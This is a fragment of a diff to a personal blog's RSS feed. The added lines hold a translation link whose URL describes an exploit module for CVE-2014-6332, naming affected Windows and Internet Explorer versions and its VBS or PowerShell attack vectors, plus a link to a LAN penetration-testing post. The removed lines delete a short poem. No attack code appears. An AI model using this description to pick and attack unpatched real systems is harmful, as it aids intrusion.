+&lt;p&gt;&lt;a href=&#34;https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead.&#34;&gt;DeepL Translate&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+- https://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ - WeepingDogel 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
     
     
     
@@ -303,38 +553,6 @@ weepingdogel@WeepingDogel /tmp&amp;gt; ./test2
 &lt;p&gt;其实细节上还是涉及到一些我可能会粗心大意忘掉的东西，所以我不敢说 &amp;ldquo;就这？就这？&amp;rdquo;&lt;/p&gt;
 &lt;p&gt;不过，相对来说还是比较简单的&amp;hellip; 嗯&amp;hellip;&lt;/p&gt;
 - https://weepingdogel.github.io/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/ - WeepingDogel 本站遵循 CC-BY-NC 4.0 协议</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>If Only I...</title>
-        <link>https://weepingdogel.github.io/posts/2020-dec-29/</link>
-        <pubDate>Sun, 29 Nov 2020 23:04:02 +0800</pubDate>
-        
-        <guid>https://weepingdogel.github.io/posts/2020-dec-29/</guid>
-        <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/2020-dec-29/ -&lt;h3 id=&#34;past&#34;&gt;PAST&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;If only I had been stronger,&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;I wouldn&amp;rsquo;t have been damaged by the WIND.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;If only I had been smarter,&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;I wouldn&amp;rsquo;t have been cheated by the CROWD.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;If only I had been more brave,&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;I wouldn&amp;rsquo;t have been thought to be a SLAVE.&lt;/strong&gt;&lt;/p&gt;
-&lt;h3 id=&#34;present&#34;&gt;PRESENT&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;If only I were more fortunate,&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;I wouldn&amp;rsquo;t drop into a CAGE.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;If only I were more cautious,&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;I wouldn&amp;rsquo;t have to be sure if it&amp;rsquo;s DANGEROUS.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;If only I worked harder,&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;I wouldn&amp;rsquo;t be said to be a LOSER.&lt;/strong&gt;&lt;/p&gt;
-&lt;h3 id=&#34;future&#34;&gt;Future&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;If only I should have a future&amp;hellip;.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;I would write the story continuously&amp;hellip;&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;em&gt;If only I&amp;hellip;.&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;I would&amp;hellip;&lt;/em&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-- https://weepingdogel.github.io/posts/2020-dec-29/ - WeepingDogel 本站遵循 CC-BY-NC 4.0 协议</description>
         </item>
     
     
